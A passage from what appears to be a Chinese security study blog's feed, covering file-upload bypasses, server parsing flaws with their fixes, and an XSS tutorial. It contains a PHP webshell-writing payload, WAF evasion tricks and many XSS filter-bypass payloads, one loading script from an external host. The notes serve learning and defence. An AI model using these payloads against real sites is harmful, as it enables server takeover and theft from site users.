。</p></li><li><p>文件幻术绕过。制作：在 <code>&lt;?php ?&gt;</code> 前添加文件幻术 ，并将 .php 改为对应扩展名。  </p><p>GIF 文件幻术：<code>47 49 46 38 39 61 (GIF89a)</code></p><blockquote><p>注意：</p><ul><li>只检测文件头（前2个字节）：文件幻术、图片马均可突破</li><li>使用 getimagesize 函数：需图片马</li><li>使用 exif_imagetype 函数：需图片马</li></ul></blockquote></li></ol><h2 id="代码逻辑漏洞"><a href="#代码逻辑漏洞" class="headerlink" title="代码逻辑漏洞"></a>代码逻辑漏洞</h2><ol><li>条件竞争</li><li>二次渲染</li><li>其他</li></ol><h2 id="数据溢出"><a href="#数据溢出" class="headerlink" title="数据溢出"></a>数据溢出</h2><p>​请求包中加入大量垃圾数据（数字、字母等字符组合）来干扰 waf 的检测，从而绕过 waf 。</p><ol><li>Content-Disposition 与 name 之间加入垃圾数据。</li><li>name 与 filename 之间加入垃圾数据。</li></ol><p>​注意，垃圾数据后面要加上分号，防止吞噬垃圾数据后面的请求字段。</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/3.png"></p><h2 id="符号变异"><a href="#符号变异" class="headerlink" title="符号变异"></a>符号变异</h2><p>​如果 waf 会对请求包中的 filename 值进行检测，那么可以：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;1.php</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">filename=&#x27;1.php</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">filename=1.php</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">filename=&quot;&quot;1.php</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">filename=&quot;1&quot;.php</span><br><span class="line">Content-Type: image/jpeg</span><br></pre></td></tr></table></figure><p>​根据开发的思路，获取 filename 的值大概率是匹配引号内的值。现在将引号不闭合或者塞入非黑名单的值，那么 filename 的值将被干扰，从而绕过 waf 。</p><h1 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>​文件解析漏洞，是指 web 容器在解析文件时将文件解析成脚本文件格式并得以执行而产生的漏洞，攻击者可以利用该漏洞实现非法文件的解析。</p><h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><p>​Apache 在解析扩展名时是从右向左进行，如果遇到不能识别的扩展名则跳过，像 .rar、.gif 是 Apache 不能识别的。假如上传文件 xxx.php.bb.rar，.rar 不认识，向前解析，.bb 也不认识，向前解析，直到 .php 。</p><p>​影响版本：</p><ul><li>Apache 2.0.x &lt;&#x3D; 2.0.59</li><li>Apache 2.2.x &lt;&#x3D; 2.2.17</li><li>Apache 2.2.2 &lt;&#x3D; 2.2.8</li></ul><h2 id="CVE-2017-15715"><a href="#CVE-2017-15715" class="headerlink" title="CVE-2017-15715"></a>CVE-2017-15715</h2><p>​上传一个后缀末尾包含换行符的文件（\x0A），可以绕过 Apache 的 FilesMatch 设置，即 xxx.php\x0A 可被解析为 xxx.php 。影响版本 Apache 2.4.0-2.4.29 。</p><p>​利用时，需要像 POST %00 截断一样使用 Hex 方法在 .php 后加上 \x0A ，访问该文件时为 xxx.php%0A 。</p><h2 id="PHP-CGI"><a href="#PHP-CGI" class="headerlink" title="PHP CGI"></a>PHP CGI</h2><p>​Nginx 默认是以 CGI 的方式支持 PHP 解析的，当访问 <code>http://x.x.x.x/phpinfo.jpg/1.php</code> 这个URL时，配置文件（nginx.conf）中 <code>$fastcgi_script_name</code> 会被设置为 <code>phpinfo.jpg/1.php</code>，然后构造成 <code>SCRIPT_FILENAME</code> 传递给 CGI 。</p><p>​但 PHP 为什么会接受这样的参数，然后将 phpinfo.jpg 作为 PHP 文件解析呢？这就涉及到 <code>fix_pathinfo</code> 选项了。如果 PHP 中开启了 fix_pathinfo 这个选项，PHP 会认为 SCRIPT_FILENAME 是 phpinfo.jpg ，而 1.php 是 PATH_INFO ，所以就会将 phpinfo.jpg 作为 PHP 文件来解析了。简单来说，由于 Nginx 的特性，只要 URL 中路径名以 <code>.php</code> 结尾，不管该文件是否存在，直接交给 PHP 处理。</p><p>​注意，新版本 PHP 引入了 security.limit_extensions ，限制了可执行文件的后缀，默认只允许执行 .php 文件，使得该漏洞难以被成功利用。</p><p>​fix_pathinfo 选项对应 phpinfo 中的 cgi.fix_pathinfo ，该值默认是开启的。PHP 里经常要获取当前请求的 URL 路径信息，一般可以通过环境变量 <code>$_SERVER[&#39;PATH_INFO&#39;]</code> 获取，而配置文件中的 <code>cgi.fix_pathinifo</code> 选项则与这个值的获取相关。</p><p>​利用形式：1.jpg 文件内写入 PHP 语句，访问</p><ul><li><p>&#x2F;1.jpg&#x2F;1.php</p></li><li><p>&#x2F;1.jpg&#x2F;.php</p></li><li><p>&#x2F;1.jpg%00.php</p><p>此方式（%00.php）影响版本：</p><ul><li>Nginx 0.5.x</li><li>Nginx 0.6.x</li><li>Nginx 0.7-0.7.65</li><li>Nginx 0.8-0.8.37</li></ul></li></ul><p>​或者上传一个名为 shell.jpg 的文件，文件内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php phpinfo(); eval($_POST[&#x27;</span>cmd<span class="string">&#x27;]); ?&gt;&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后访问 <code>shell.jpg/.php</code>，在当前目录下就会生成一句话木马 shell.php 。</p><h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><p>​使用 IIS5.x-6.x 版本的服务器的网站一般比较老，开发语言一般为 asp ，该解析漏洞也只能解析 .asp 文件。</p><ul><li>如果网站目录中有一个以 .asp、.asa 结尾为名的文件夹，那么该文件夹下的所有文件都会被当作 .asp 文件来执行。</li><li>解析文件名时会将分号后面的内容丢弃，所以可构造如 xxx.asp;.jpg 来绕过黑名单检测。</li></ul><p>​IIS6.0 默认的可执行文件除了 .asp 还包含这三种：xx.asa、xx.cer、xx.cdx ，因为这三个扩展名和 .asp 都是用同一个 asp.dll 文件来执行。可在 IIS管理器-&gt;处理程序映射 中查看：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/2.png"></p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1.png"></p><p>​IIS 7.0&#x2F;7.5 中也存在 PHP CGI 解析漏洞。</p><h1 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h1><ol><li><p>修改 Apache 配置文件，或者添加一个 .htaccess 文件并写入，禁止 .php 等扩展名的文件执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch ~ &quot;\.(php|.php3)$&quot;&gt;</span><br><span class="line">Order Allow,Deny</span><br><span class="line">Deny from all</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>Files 和 FilesMatch：都是用于匹配文件，对文件的操作进行限制。Files 一般用于单个文件，虽然也支持正则表达式，但一般用完整的单个文件名。FilesMatch 一般用于多个文件，必须用正则表达式。</p><p>Allow 和 Deny 可以用于控制目录和文件的访问授权。常见如：</p><blockquote><p>Order Deny,Allow<br>Allow from All</p></blockquote><p>注意 <code>Deny,Allow</code> 中间只有一个逗号，也只能有一个逗号，有空格会出错。单词的大小写不限。</p><p>上面设定的含义是“先检查禁止设定，没有禁止的全部允许”，而第二句没有 Deny ，也就是没有禁止访问的设定，允许所有访问。这个主要是用来确保或者覆盖上级目录的设置，开放所有内容的访问权。</p><p>按照上面的解释，下面的设定是无条件禁止访问：</p><blockquote><p>Order Allow,Deny<br>Deny from All</p></blockquote><p>如果要禁止部分内容的访问，其他的全部开放：</p><blockquote><p>Order Deny,Allow<br>Deny from ip1 ip2</p></blockquote><p>或者：</p><blockquote><p>Order Allow,Deny<br>Allow from all<br>Deny from ip1 ip2</p></blockquote><p>Apache 会按照 Order 决定最后使用哪一条规则。比如上面的第二种方式，虽然第二句 Allow 允许了访问，但由于在 Order 中 Allow 不是最后规则，因此还需要看有没有 Deny规则，于是到了第三句，符合 ip1 和 ip2 的访问就被禁止了。</p><p>注意，Order 决定的最后规则非常重要，下面是两个错误的例子和改正方式：</p><blockquote><p>Order Deny,Allow<br>Allow from all<br>Deny from domain.org</p></blockquote><p>错误：想禁止来自 domain.org 的访问，但是 Deny 不是最后规则，Apache 在处理到第二句 Allow 的时候就已经匹配成功，根本就不会去看第三句。</p><p>解决方法：Order Allow,Deny，后面两句不动即可。</p><blockquote><p>Order Allow,Deny<br>Allow from ip1<br>Deny from all</p></blockquote><p>错误：想只允许来自 ip1 的访问，但是，虽然第二句中设定了 Allow 规则，由于 Order 中 Deny 在后，所以会以第三句 Deny 为准，而第三句的范围中又明显包含了 ip1 ，所以所有的访问都被禁止了。</p><p>解决方法一：直接去掉第三句。</p><p>解决方法二：</p><blockquote><p>Order Deny,Allow<br>Deny from all<br>Allow from ip1</p></blockquote></li><li><p>修改 php.ini 文件，将 cgi.fix_pathinfo 的值设置为 0（慎用）。</p></li><li><p>在 Nginx 配置文件中添加以下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ( $fastcgi_script_name ~ ..*/.*php ) &#123;</span><br><span class="line">return 403;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解释：当匹配到类似 test.jpg&#x2F;a.php 的 URL 时，将返回 403 错误代码。</p></li><li><p>不提供对上传的原文件进行访问，或对访问原文件时显示的内容经过输出程序处理。</p></li><li><p>图片单独放一个服务器上，与业务代码数据进行隔离。</p></li><li><p>升级 PHP、Apache、Nginx 等的版本。</p></li><li><p>设置文件夹访问权限。</p></li><li><p>扩展名黑名单、白名单。</p></li><li><p>重命名上传文件。</p></li><li><p>不暴露上传路径和保存文件名。</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;em&gt;&lt;strong&gt;建议结合 upload-labs 笔记一起看&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;常见突破方式&quot;&gt;&lt;a href=&quot;#常见突破方式&quot; class=&quot;headerlink&quot; title=&quot;常见突破方式&quot;&gt;&lt;/a&gt;常见突破方式&lt;/h1&gt;&lt;</summary>
      
    
    
    
    <category term="学习笔记" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="web安全" scheme="http://example.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>XSS漏洞学习</title>
    <link href="http://example.com/2024/01/24/XSS/"/>
    <id>http://example.com/2024/01/24/XSS/</id>
    <published>2024-01-23T16:00:00.000Z</published>
    <updated>2024-01-24T08:39:06.587Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>​反射型 XSS ：</p><p>​xss.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>Tell me who you are, and I will welcome you!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;./test.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span>&gt;</span></span><br><span class="line">            Your name: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>send<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Hello, <span class="subst">$user</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​原本这只是一个简单的欢迎：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/XSS/1.png"></p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/XSS/2.png"></p><p>​但如果输入的是恶意代码，如 <code>&lt;script&gt;alert(&quot;Hacker!&quot;);&lt;/script&gt;</code> ，那就成 XSS 了：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/XSS/3.png"></p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>​网站只是简单地将用户输入的数据直接或未经过完善的安全过滤就在浏览器中进行输岀，导致输岀的数据中存在可被浏览器执行的代码。</p><h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><h2 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h2><p>​又称非持久型 XSS ，这种攻击方式往往具有一次性，只在用户单击时触发。例如当用户提交一个表单时，跨站代码随同请求包发送到服务端，然后服务端反射回来，之后被浏览器解析跨站代码触发 XSS 漏洞。</p><p>​这类跨站的代码通常不存储在服务端。受 XSS Auditor（Chrome内置的XSS保护）、NoScript 等防御手段的影响，反射型 XSS 的危害相对较小。</p><h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><p>​又称持久型 XSS ，比反射型 XSS 更具有威胁性，攻击脚本被永久存放在服务器的数据库或文件中。</p><p>​攻击方式：攻击者在发帖或留言等过程中，将恶意脚本连同正常信息一起写入到发布内容中。随着发布内容被服务器存储下来，恶意脚本也将永久的存放到服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本就会在用户的浏览器中执行。</p><h2 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h2><p>​基于 JS 的一种 XSS ，不需要与服务器进行交互，其通过修改页面 DOM 节点数据信息而形成 XSS 攻击。</p><p>​攻击方式：用户请求一个由攻击者提供的 URL ，其中包含恶意代码，当用户的浏览器处理这个响应时，原始页面的 DOM 将会被修改，从而触发 XSS 漏洞。</p><h2 id="通用型"><a href="#通用型" class="headerlink" title="通用型"></a>通用型</h2><p>​也叫做 UXSS ，是一种利用浏览器或者浏览器扩展程序的漏洞来制造产生 XSS 的一种攻击类型。</p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><h2 id=""><a href="#" class="headerlink" title="&lt;script&gt;"></a>&lt;script&gt;</h2><ol><li><code>&lt;script src=&quot;http://xxx/xss.js&quot;&gt;&lt;/script&gt;</code></li><li><code>&lt;script&gt;xss code&lt;/script&gt;</code></li></ol><h2 id="-1"><a href="#-1" class="headerlink" title="&lt;img&gt;"></a>&lt;img&gt;</h2><ol><li><code>&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;/&gt;</code></li><li><code>&lt;img src=&quot;1&quot; onerror=&quot;eval(alert(&#39;xss&#39;))&quot;/&gt;</code></li><li><code>&lt;img src=&quot;1&quot; onmouseover=&quot;alert(&#39;xss&#39;)&quot;/&gt;</code></li><li><code>&lt;img src=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;</code> ，IE7 以下。</li><li><code>&lt;img src=&quot;&quot; style=&quot;xss:expression(alert(&#39;xss&#39;))&quot;/&gt; </code> ，IE7 以下。</li></ol><h2 id="-2"><a href="#-2" class="headerlink" title="&lt;a&gt;"></a>&lt;a&gt;</h2><ol><li><code>&lt;a href=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;aa&lt;/a&gt;</code></li><li><code>&lt;a href=&quot;javascript:eval(alert(&#39;xss&#39;))&quot;&gt;aa&lt;/a&gt;</code></li><li><code>&lt;a href=&quot;&quot; onmouseover=&quot;alert(&#39;xss&#39;)&quot;&gt;aa&lt;/a&gt;</code></li><li><code>&lt;a href=&quot;&quot; onclick=&quot;eval(alert(&#39;xss&#39;))&quot;&gt;aa&lt;/a&gt;</code></li></ol><h2 id="-3"><a href="#-3" class="headerlink" title="&lt;input&gt;"></a>&lt;input&gt;</h2><ol><li><code>&lt;input value=&quot;&quot; onclick=&quot;alert(&#39;xss&#39;)&quot; type=&quot;text&quot;/&gt;</code></li><li>onmouseover</li></ol><h2 id="-4"><a href="#-4" class="headerlink" title="&lt;form&gt;"></a>&lt;form&gt;</h2><ol><li><code>&lt;form action=&quot;javascript:alert(&#39;xss&#39;)&quot; method=&quot;get&quot;&gt;</code></li><li><code>&lt;form action=&quot;&quot; method=&quot;GET&quot; onmouseover=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;</code></li><li>onclick</li></ol><h2 id="-5"><a href="#-5" class="headerlink" title="&lt;iframe&gt;"></a>&lt;iframe&gt;</h2><ol><li><code>&lt;iframe src=&quot;javascript:alert(&#39;xss&#39;)&quot; height=&quot;5&quot; width=&quot;1000&quot;&gt;&lt;/iframe&gt;</code></li><li><code>&lt;iframe src=&quot;aaa&quot; onmouseover=&quot;alert(&#39;xss&#39;)&quot;&gt;&lt;/iframe&gt;</code></li><li><code>&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;&lt;/iframe&gt;</code> （<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>）</li></ol><h2 id="-6"><a href="#-6" class="headerlink" title="&lt;svg&gt;"></a>&lt;svg&gt;</h2><p>​<code>&lt;svg onload=&quot;alert(1)&quot;&gt;&lt;/svg&gt;</code></p><h2 id="-7"><a href="#-7" class="headerlink" title="&lt;details&gt;"></a>&lt;details&gt;</h2><ol><li><code>&lt;details ontoggle=&quot;alert(&#39;xss&#39;)&quot;&gt;&lt;/details&gt;</code></li><li><code>&lt;details open ontoggle=&quot;alert(&#39;xss&#39;)&quot;&gt;&lt;/details&gt;</code> ，自动触发。</li></ol><h2 id="-8"><a href="#-8" class="headerlink" title="&lt;select&gt;"></a>&lt;select&gt;</h2><p>​<code>&lt;select onfocus=&quot;alert(1)&quot;&gt;&lt;/select&gt;</code></p><h2 id="-9"><a href="#-9" class="headerlink" title="&lt;video&gt;"></a>&lt;video&gt;</h2><p>​<code>&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;/&gt;&lt;/video&gt;</code></p><h2 id="-10"><a href="#-10" class="headerlink" title="&lt;audio&gt;"></a>&lt;audio&gt;</h2><p>​<code>&lt;audio src=&quot;x&quot; onerror=&quot;alert(&#39;xss&#39;)&quot;&gt;&lt;/audio&gt;</code></p><h2 id="-11"><a href="#-11" class="headerlink" title="&lt;textarea&gt;"></a>&lt;textarea&gt;</h2><ol><li><code>&lt;textarea onfocus=&quot;alert(&#39;xss&#39;)&quot;&gt;&lt;/textarea&gt;</code></li><li><code>&lt;textarea onfocus=&quot;alert(&#39;xss&#39;)&quot; autofocus&gt;&lt;/textarea&gt;</code> ，自动触发。</li></ol><h2 id="-12"><a href="#-12" class="headerlink" title="&lt;link&gt;"></a>&lt;link&gt;</h2><p>​<code>&lt;link rel=import href=&quot;http://xxx/xss.js&quot;&gt;</code> ，但需要在无 CSP 的情况下才可以。</p><blockquote><p>内容安全策略 (CSP) 是一种安全机制，有助于保护 Web 应用程序免受各种类型的攻击，例如跨站点脚本 (XSS) 和数据注入。 它是一个 HTTP 响应标头，指示浏览器允许在网页上加载和执行哪些内容源。</p><p>CSP 的主要目的是减轻与执行恶意脚本或从外部域加载未经授权的资源相关的风险。 通过定义 Content-Security-Policy 标头，网站管理员可以定义一组指令，通知浏览器允许加载的内容类型。</p></blockquote><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><ol><li>HTML 实体编码：<code>&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;/&gt;</code> 。实际上是每个字符的 ASCII 码用 &amp;# 和 ; 包围而已，即用 HTML 实体的形式表示字符串。</li><li>Unicode 编码：<code>&lt;img src=&quot;x&quot; onerror=&quot;eval(&#39;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#39;)&quot;/&gt;</code> 。</li><li>URL 编码：<code>&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&#39;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#39;))&quot;/&gt;</code> 。</li><li>ASCII 编码：<code>&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;/&gt;</code> 。</li><li>HEX 编码：<code>&lt;img src=&quot;x&quot; onerror=&quot;eval(&#39;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#39;)&quot;/&gt;</code> 。</li><li>八进制：<code>&lt;img src=&quot;x&quot; onerror=&quot;alert(&#39;\170\163\163&#39;)&quot;/&gt;</code></li><li>base64：<code>&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#39;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#39;))&quot;/&gt;</code> 。</li></ol><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><ol><li><code>/</code> 代替空格，如 <code>&lt;img/src=&quot;x&quot;/onerror=&quot;alert(&#39;xss&#39;)&quot;/&gt;</code> 。</li><li>编码代替。</li></ol><h2 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h2><ol><li><p>大小写绕过。</p></li><li><p>字符拼接绕过：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//eval</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;a=`aler`;b=`t`;c=`(&#x27;xss&#x27;)`;eval(a+b+c)&quot;</span>/&gt;</span></span><br><span class="line">//top</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">top[<span class="string">&quot;al&quot;</span>+<span class="string">&quot;ert&quot;</span>](<span class="string">`xss`</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>编码代替。</p></li></ol><h2 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h2><ol><li>HTML 可不需要引号，JavaScript 可用反引号 &#96; 代替。</li><li>编码代替。</li></ol><h2 id="过滤括号"><a href="#过滤括号" class="headerlink" title="过滤括号"></a>过滤括号</h2><ol><li>throw 代替：<code>&lt;img src=&quot;x&quot; onerror=&quot;window.onerror=eval;throw&#39;=alert\x281\x29&#39;&quot;/&gt;</code></li><li>编码代替。</li></ol><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ol><li>Windows 下 HTML 标签中用 <code>//</code> 可以代替 <code>http://</code> ：<code>&lt;img src=&quot;x&quot; onerror=&quot;document.location=&#39;//www.baidu.com&#39;&quot;/&gt;</code> ，Linux 下为 <code>\\</code> 。</li><li>域名中的中文句号浏览器会自动转化成英文句号：<code>&lt;img src=&quot;x&quot; onerror=&quot;document.location=&#39;http://www。baidu。com&#39;&quot;/&gt;</code> 。</li></ol><h1 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h1><h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>​同源策略是指在 Web 浏览器中，允许某个网页脚本访问另一个网页的数据，但前提是这两个网页必须有相同的协议 、主机名和端口号，一旦两个网站满足上述条件，这两个网站就被认定为具有相同来源。此策略可防止某个网页上的恶意脚本通过该页面的文档对象模型访问另一网页上的敏感数据。</p><p>​同源策略对 Web 应用程序具有特殊意义，因为 Web 应用程序广泛依赖 HTTP cookie 来维持用户会话，所以必须将不相关网站严格分隔，以防止丢失数据泄露。</p><p>​值得注意的是同源策略仅适用于脚本，这意味着某网站可以通过相应的 HTML 标签访问不同来源网站上的图像、CSS 和动态加载脚本等资源。</p><p>​同源策略对于网站安全是很重要的。如果没有同源限制，下述示例的攻击将是十分危险的：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/XSS/8.png"></p><h2 id="跨域方法"><a href="#跨域方法" class="headerlink" title="跨域方法"></a>跨域方法</h2><h3 id="src"><a href="#src" class="headerlink" title="src"></a>src</h3><p>​所有具有 src 属性的 HTML 标签都是可以跨域的，加载的方式其实相当于一次普通的 GET 请求，唯一不同的是，为了安全起见，浏览器不允许这种方式下对加载到的资源的读写操作，而只能使用标签本身应当具备的能力，比如脚本执行、样式应用等。</p><h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><p>​JSONP 是 JSON with Padding 的略称，它是一个非官方的协议。由于 JavaScript 跨域脚本可以回调当前脚本的函数，所以该协议的一个要点就是允许用户传递一个 callback 参数给服务端，然后服务端返回数据时会将这个 callback 参数作为函数名来包裹住 JSON 数据，使得客户端调用该函数，这样客户端就可以通过随意定制该函数来自动处理返回数据了。</p><p>​&lt;script&gt; 标签只能发起 GET 请求。</p><p>​test.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">dosomething</span>(<span class="params">jsondata</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//处理服务端返回的JSON数据</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="title function_">alert</span>(jsondata);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/test.php?callback=dosomething&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​test.php：</p><figure class="highlight php"><table><tr><td 